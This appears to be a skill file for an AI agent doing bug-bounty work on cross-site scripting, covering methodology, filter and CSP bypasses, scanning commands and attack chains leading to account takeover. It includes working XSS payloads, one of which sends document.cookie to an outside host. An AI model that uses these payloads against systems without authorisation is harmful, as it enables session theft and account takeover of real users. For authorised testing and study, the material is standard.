---
skill: xss
title: "XSS (reflected / stored / DOM / blind)"
category: "Security · Web Exploitation"
load_when: "Any user input rendered in a page or reachable client-side sink."
pack: SUPERAGENT V10
bughunt: true
---
# XSS (reflected / stored / DOM / blind)

## Where it pays
Session/token theft, ATO, CSRF-token exfil, admin compromise. Stored & blind pay most.

## Attack-surface signals
Reflections in HTML/attr/JS/URL context; persisted fields (profile/comment/filename); admin-rendered logs (blind); DOM source→sink.

## Methodology
1. kxss to find reflections; identify context; break out.
2. Stored: inject in every persisted field, watch admin renders (blind XSS callback).
3. DOM: trace location/postMessage → innerHTML/eval.
4. Filter bypass: case/encoding/events/javascript:/mXSS.

## Payloads
```
"><svg onload=alert(document.domain)>
'-alert(1)-'
<img src=x onerror=fetch('//c/'+document.cookie)>
```
More: `../payloads/xss.txt`.

## Root causes
No output encoding for the render context · dangerouslySetInnerHTML/v-html · reflecting into inline JS.

## Bypasses
Context confusion · svg/math vectors · entities/double-encoding · CSP gaps (JSONP, unsafe-inline) · DOM clobbering.

## 🧪 Try it locally (hands-on)
```bash
python3 ../../../tools/skill_router.py "reflected xss in search param"

# Find reflected params on in-scope URLs, then test context-aware payloads
cat urls.txt | kxss                          # flags reflected params
dalfox file urls.txt                         # automated XSS probing
# Context break-out payloads live in ../payloads/xss.txt
```
## Validation gate
JS must execute (alert document.domain or callback fires) in victim context — reflection alone isn't XSS.

## Impact & chains
steal session → **ATO**; blind XSS in admin → **admin takeover**; CSRF-token theft; CORS exfil combo.

**→ next on hit: `../phases/04-chain.md`. Payloads in `../payloads/`.**
